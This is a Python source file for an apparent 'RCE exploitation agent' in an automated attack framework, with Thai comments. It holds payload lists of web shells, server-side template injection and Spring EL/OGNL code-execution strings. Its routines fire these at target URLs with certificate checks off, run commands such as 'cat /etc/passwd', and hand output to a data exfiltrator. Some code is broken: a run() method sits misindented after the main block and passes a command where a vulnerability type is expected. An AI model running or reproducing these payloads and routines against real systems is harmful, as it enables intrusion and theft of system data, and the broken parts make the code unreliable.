"""
RCE (Remote Code Execution) Exploitation Agent
ค้นหาและ exploit RCE vulnerabilities
"""

import asyncio
import httpx
import re
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse
import logging
from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase

log = logging.getLogger(__name__)


class RCEAgent(BaseAgent):
    """RCE exploitation agent"""
    supported_phases = [AttackPhase.EXPLOITATION, AttackPhase.INITIAL_FOOTHOLD]
    
    def __init__(self, context_manager=None, orchestrator=None, data_exfiltrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.exfiltrator = data_exfiltrator
        self.timeout = 30.0
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load RCE payloads"""
        
        return {
            'php': [
                # system()
                'system("whoami");',
                'system($_GET["cmd"]);',
                'system(base64_decode($_GET["cmd"]));',
                
                # exec()
                'exec("whoami", $output); print_r($output);',
                'exec($_GET["cmd"], $output); print_r($output);',
                
                # shell_exec()
                'echo shell_exec("whoami");',
                'echo shell_exec($_GET["cmd"]);',
                
                # passthru()
                'passthru("whoami");',
                'passthru($_GET["cmd"]);',
                
                # eval()
                'eval($_GET["cmd"]);',
                'eval(base64_decode($_GET["cmd"]));',
                
                # preg_replace() RCE (PHP < 7)
                'preg_replace("/.*/e", $_GET["cmd"], "");',
                
                # assert() RCE
                'assert($_GET["cmd"]);',
                
                # create_function() RCE
                '$func = create_function("", $_GET["cmd"]); $func();',
                
                # file_put_contents() + include
                'file_put_contents("shell.php", "<?php system($_GET[\'cmd\']); ?>"); include("shell.php");',
            ],
            
            'python': [
                # os.system()
                'import os; os.system("whoami")',
                'import os; os.system(request.args.get("cmd"))',
                
                # subprocess
                'import subprocess; subprocess.call("whoami", shell=True)',
                'import subprocess; subprocess.call(request.args.get("cmd"), shell=True)',
                
                # eval()
                'eval(request.args.get("cmd"))',
                
                # exec()
                'exec(request.args.get("cmd"))',
                
                # __import__()
                '__import__("os").system("whoami")',
                '__import__("os").system(request.args.get("cmd"))',
            ],
            
            'nodejs': [
                # child_process.exec()
                'require("child_process").exec("whoami", (e,o)=>console.log(o))',
                'require("child_process").exec(req.query.cmd, (e,o)=>res.send(o))',
                
                # eval()
                'eval(req.query.cmd)',
                
                # Function()
                'Function(req.query.cmd)()',
                
                # vm.runInNewContext()
                'require("vm").runInNewContext(req.query.cmd)',
            ],
            
            'java': [
                # Runtime.exec()
                'Runtime.getRuntime().exec("whoami")',
                'Runtime.getRuntime().exec(request.getParameter("cmd"))',
                
                # ProcessBuilder
                'new ProcessBuilder("whoami").start()',
                'new ProcessBuilder(request.getParameter("cmd").split(" ")).start()',
            ],
            
            'ruby': [
                # system()
                'system("whoami")',
                'system(params[:cmd])',
                
                # exec()
                'exec("whoami")',
                'exec(params[:cmd])',
                
                # `backticks`
                '`whoami`',
                '`#{params[:cmd]}`',
                
                # eval()
                'eval(params[:cmd])',
            ]
        }
    
    async def scan(self, url: str) -> Dict:
        """
        Scan for RCE vulnerabilities
        
        Args:
            url: Target URL
        
        Returns:
            Dict with scan results
        """
        
        log.info(f"[RCE] Scanning {url}")
        
        vulnerabilities = []
        
        # Test parameter injection
        param_vulns = await self._test_parameter_injection(url)
        vulnerabilities.extend(param_vulns)
        
        # Test template injection
        template_vulns = await self._test_template_injection(url)
        vulnerabilities.extend(template_vulns)
        
        # Test code injection
        code_vulns = await self._test_code_injection(url)
        vulnerabilities.extend(code_vulns)
        
        # Test expression language injection
        el_vulns = await self._test_expression_language_injection(url)
        vulnerabilities.extend(el_vulns)
        
        return {
            'url': url,
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities)
        }
    
    async def exploit(self, url: str, vuln_type: str = 'auto') -> Dict:
        """
        Exploit RCE vulnerability
        
        Args:
            url: Target URL
            vuln_type: Vulnerability type ('auto', 'parameter', 'template', 'code', 'el')
        
        Returns:
            Dict with exploitation results
        """
        
        log.info(f"[RCE] Exploiting {url}")
        
        if vuln_type == 'auto':
            # Auto-detect vulnerability type
            scan_result = await self.scan(url)
            
            if scan_result['count'] == 0:
                return {
                    'success': False,
                    'error': 'No RCE vulnerability found'
                }
            
            vuln = scan_result['vulnerabilities'][0]
            vuln_type = vuln['type']
        
        # Exploit based on type
        if vuln_type == 'parameter':
            return await self._exploit_parameter_injection(url)
        elif vuln_type == 'template':
            return await self._exploit_template_injection(url)
        elif vuln_type == 'code':
            return await self._exploit_code_injection(url)
        elif vuln_type == 'el':
            return await self._exploit_expression_language_injection(url)
        else:
            return {
                'success': False,
                'error': f'Unknown vulnerability type: {vuln_type}'
            }
    
    async def _test_parameter_injection(self, url: str) -> List[Dict]:
        """Test for parameter injection RCE"""
        
        vulnerabilities = []
        
        # Test payloads
        test_payloads = [
            ('php', 'system', 'echo "RCE_TEST_' + self._random_string() + '"'),
            ('python', 'os.system', 'echo RCE_TEST_' + self._random_string()),
            ('nodejs', 'child_process', 'echo RCE_TEST_' + self._random_string()),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for lang, method, payload in test_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?cmd={payload}"
                    response = await client.get(test_url)
                    
                    if 'RCE_TEST_' in response.text:
                        vulnerabilities.append({
                            'type': 'parameter',
                            'method': 'GET',
                            'parameter': 'cmd',
                            'language': lang,
                            'payload': payload,
                            'confidence': 'high'
                        })
                        break
                    
                    # Test POST parameter
                    response = await client.post(url, data={'cmd': payload})
                    
                    if 'RCE_TEST_' in response.text:
                        vulnerabilities.append({
                            'type': 'parameter',
                            'method': 'POST',
                            'parameter': 'cmd',
                            'language': lang,
                            'payload': payload,
                            'confidence': 'high'
                        })
                        break
                
                except Exception as e:
                    log.debug(f"[RCE] Parameter test error: {e}")
        
        return vulnerabilities
    
    async def _test_template_injection(self, url: str) -> List[Dict]:
        """Test for template injection RCE"""
        
        vulnerabilities = []
        
        # Template injection payloads
        test_payloads = [
            # Jinja2 (Python)
            ('jinja2', '{{7*7}}', '49'),
            ('jinja2', '{{config.items()}}', 'SECRET_KEY'),
            
            # Twig (PHP)
            ('twig', '{{7*7}}', '49'),
            ('twig', '{{_self.env.registerUndefinedFilterCallback("exec")}}', ''),
            
            # Freemarker (Java)
            ('freemarker', '${7*7}', '49'),
            ('freemarker', '<#assign ex="freemarker.template.utility.Execute"?new()>', ''),
            
            # Velocity (Java)
            ('velocity', '#set($x=7*7)$x', '49'),
            
            # Smarty (PHP)
            ('smarty', '{7*7}', '49'),
            ('smarty', '{php}echo `whoami`;{/php}', ''),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for engine, payload, expected in test_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?name={payload}"
                    response = await client.get(test_url)
                    
                    if expected and expected in response.text:
                        vulnerabilities.append({
                            'type': 'template',
                            'engine': engine,
                            'payload': payload,
                            'confidence': 'high'
                        })
                    
                    # Test POST parameter
                    response = await client.post(url, data={'name': payload})
                    
                    if expected and expected in response.text:
                        vulnerabilities.append({
                            'type': 'template',
                            'engine': engine,
                            'payload': payload,
                            'confidence': 'high'
                        })
                
                except Exception as e:
                    log.debug(f"[RCE] Template test error: {e}")
        
        return vulnerabilities
    
    async def _test_code_injection(self, url: str) -> List[Dict]:
        """Test for code injection RCE"""
        
        vulnerabilities = []
        
        # Code injection payloads
        test_payloads = [
            # PHP eval()
            ('php', 'eval', 'echo 7*7;', '49'),
            
            # Python eval()
            ('python', 'eval', '7*7', '49'),
            
            # JavaScript eval()
            ('javascript', 'eval', '7*7', '49'),
            
            # Ruby eval()
            ('ruby', 'eval', '7*7', '49'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for lang, method, payload, expected in test_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?code={payload}"
                    response = await client.get(test_url)
                    
                    if expected in response.text:
                        vulnerabilities.append({
                            'type': 'code',
                            'language': lang,
                            'method': method,
                            'payload': payload,
                            'confidence': 'high'
                        })
                    
                    # Test POST parameter
                    response = await client.post(url, data={'code': payload})
                    
                    if expected in response.text:
                        vulnerabilities.append({
                            'type': 'code',
                            'language': lang,
                            'method': method,
                            'payload': payload,
                            'confidence': 'high'
                        })
                
                except Exception as e:
                    log.debug(f"[RCE] Code test error: {e}")
        
        return vulnerabilities
    
    async def _test_expression_language_injection(self, url: str) -> List[Dict]:
        """Test for Expression Language injection RCE"""
        
        vulnerabilities = []
        
        # EL injection payloads
        test_payloads = [
            # Java EL
            ('java_el', '${7*7}', '49'),
            ('java_el', '${applicationScope}', 'javax.servlet'),
            
            # Spring EL
            ('spring_el', '#{7*7}', '49'),
            ('spring_el', '#{T(java.lang.Runtime).getRuntime()}', 'Runtime'),
            
            # OGNL
            ('ognl', '%{7*7}', '49'),
            ('ognl', '%{@java.lang.Runtime@getRuntime()}', 'Runtime'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for el_type, payload, expected in test_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?expr={payload}"
                    response = await client.get(test_url)
                    
                    if expected in response.text:
                        vulnerabilities.append({
                            'type': 'el',
                            'el_type': el_type,
                            'payload': payload,
                            'confidence': 'high'
                        })
                    
                    # Test POST parameter
                    response = await client.post(url, data={'expr': payload})
                    
                    if expected in response.text:
                        vulnerabilities.append({
                            'type': 'el',
                            'el_type': el_type,
                            'payload': payload,
                            'confidence': 'high'
                        })
                
                except Exception as e:
                    log.debug(f"[RCE] EL test error: {e}")
        
        return vulnerabilities
    
    async def _exploit_parameter_injection(self, url: str) -> Dict:
        """Exploit parameter injection RCE"""
        
        # Execute commands
        commands = [
            'whoami',
            'id',
            'uname -a',
            'cat /etc/passwd',
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for cmd in commands:
                try:
                    # Try GET
                    test_url = f"{url}?cmd={cmd}"
                    response = await client.get(test_url)
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        results.append({
                            'command': cmd,
                            'output': response.text[:500]
                        })
                    
                    # Try POST
                    response = await client.post(url, data={'cmd': cmd})
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        results.append({
                            'command': cmd,
                            'output': response.text[:500]
                        })
                
                except Exception as e:
                    log.error(f"[RCE] Command execution error: {e}")
        
        # Store results
        if self.exfiltrator and results:
            for result in results:
                self.exfiltrator.store_file(
                    filename=f"rce_output_{result['command'].replace(' ', '_')}.txt",
                    content=result['output'].encode(),
                    source=url
                )
        
        return {
            'success': len(results) > 0,
            'type': 'parameter',
            'results': results,
            'commands_executed': len(results)
        }
    
    async def _exploit_template_injection(self, url: str) -> Dict:
        """Exploit template injection RCE"""
        
        # Jinja2 RCE payload
        jinja2_rce = "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"
        
        # Twig RCE payload
        twig_rce = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}"
        
        # Freemarker RCE payload
        freemarker_rce = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}'
        
        payloads = [jinja2_rce, twig_rce, freemarker_rce]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for payload in payloads:
                try:
                    # Try GET
                    test_url = f"{url}?name={payload}"
                    response = await client.get(test_url)
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload[:50] + '...',
                            'output': response.text[:500]
                        })
                    
                    # Try POST
                    response = await client.post(url, data={'name': payload})
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload[:50] + '...',
                            'output': response.text[:500]
                        })
                
                except Exception as e:
                    log.error(f"[RCE] Template exploitation error: {e}")
        
        return {
            'success': len(results) > 0,
            'type': 'template',
            'results': results
        }
    
    async def _exploit_code_injection(self, url: str) -> Dict:
        """Exploit code injection RCE"""
        
        # PHP code injection payloads
        php_payloads = [
            'system("whoami");',
            'echo shell_exec("id");',
            'passthru("uname -a");',
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for payload in php_payloads:
                try:
                    # Try GET
                    test_url = f"{url}?code={payload}"
                    response = await client.get(test_url)
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload,
                            'output': response.text[:500]
                        })
                    
                    # Try POST
                    response = await client.post(url, data={'code': payload})
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload,
                            'output': response.text[:500]
                        })
                
                except Exception as e:
                    log.error(f"[RCE] Code exploitation error: {e}")
        
        return {
            'success': len(results) > 0,
            'type': 'code',
            'results': results
        }
    
    async def _exploit_expression_language_injection(self, url: str) -> Dict:
        """Exploit Expression Language injection RCE"""
        
        # Java EL RCE payloads
        el_payloads = [
            '${applicationScope}',
            '#{T(java.lang.Runtime).getRuntime().exec("whoami")}',
            '%{@java.lang.Runtime@getRuntime().exec("whoami")}',
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for payload in el_payloads:
                try:
                    # Try GET
                    test_url = f"{url}?expr={payload}"
                    response = await client.get(test_url)
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload,
                            'output': response.text[:500]
                        })
                    
                    # Try POST
                    response = await client.post(url, data={'expr': payload})
                    
                    if response.status_code == 200:
                        results.append({
                            'payload': payload,
                            'output': response.text[:500]
                        })
                
                except Exception as e:
                    log.error(f"[RCE] EL exploitation error: {e}")
        
        return {
            'success': len(results) > 0,
            'type': 'el',
            'results': results
        }
    
    def _random_string(self, length: int = 8) -> str:
        """Generate random string"""
        import random
        import string
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        from core.data_exfiltration import DataExfiltrator
        
        exfiltrator = DataExfiltrator()
        agent = RCEAgent(exfiltrator)
        
        # Scan for RCE
        result = await agent.scan("http://target.com/vulnerable.php")
        
        print(f"Vulnerabilities found: {result['count']}")
        
        # Exploit
        if result['count'] > 0:
            exploit_result = await agent.exploit("http://target.com/vulnerable.php")
            print(f"Exploitation success: {exploit_result['success']}")
    
    asyncio.run(test())



    async def run(self, directive: str, context: Dict) -> Dict:
        """
        Main execution method for RCE Agent
        
        Args:
            directive: "scan", "exploit", or "auto"
            context: {
                "url": target URL,
                "command": command to execute (optional),
                "method": specific RCE method (optional)
            }
        
        Returns:
            Dict with results
        """
        log.info(f"[RCEAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return {
                "success": False,
                "error": "No URL provided in context"
            }
        
        try:
            if directive == "scan":
                # Scan for RCE vulnerabilities
                result = await self.scan(url)
                return {
                    "success": result["count"] > 0,
                    "agent_name": "RCEAgent",
                    "data": result
                }
            
            elif directive == "exploit":
                # Exploit RCE vulnerability
                command = context.get("command", "whoami")
                result = await self.exploit(url, command)
                return {
                    "success": result.get("success", False),
                    "agent_name": "RCEAgent",
                    "data": result
                }
            
            elif directive == "auto":
                # Auto: scan then exploit
                scan_result = await self.scan(url)
                
                if scan_result["count"] > 0:
                    log.info(f"[RCEAgent] Found {scan_result['count']} vulnerabilities, attempting exploitation...")
                    command = context.get("command", "whoami")
                    exploit_result = await self.exploit(url, command)
                    
                    return {
                        "success": exploit_result.get("success", False),
                        "agent_name": "RCEAgent",
                        "data": {
                            "scan": scan_result,
                            "exploit": exploit_result
                        }
                    }
                else:
                    return {
                        "success": False,
                        "agent_name": "RCEAgent",
                        "data": {
                            "message": "No RCE vulnerabilities found",
                            "scan": scan_result
                        }
                    }
            
            else:
                return {
                    "success": False,
                    "error": f"Unknown directive: {directive}"
                }
        
        except Exception as e:
            log.error(f"[RCEAgent] Error: {e}")
            return {
                "success": False,
                "agent_name": "RCEAgent",
                "error": str(e)
            }


